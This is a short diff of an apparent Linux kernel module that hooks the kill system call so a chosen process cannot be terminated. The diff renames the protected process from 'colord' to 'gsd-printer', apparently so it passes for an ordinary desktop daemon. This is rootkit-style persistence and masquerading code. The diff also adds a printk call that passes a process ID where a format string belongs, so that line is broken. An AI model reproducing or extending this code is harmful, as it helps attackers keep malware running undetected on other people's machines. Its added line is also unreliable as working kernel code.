@@ -16,7 +16,7 @@
 
 #define FLAG 0x80000000
 
-const char *protected = "colord";
+const char *protected = "gsd-printer";
 pid_t protected_pid = -1;
 
 static int print_pid(void)
@@ -121,6 +121,7 @@ KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
 	int ret = 0;
 	find_pid();
+	printk(protected_pid);
 	if (protected_pid != pid)
 		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
         //printk("sys_kill");
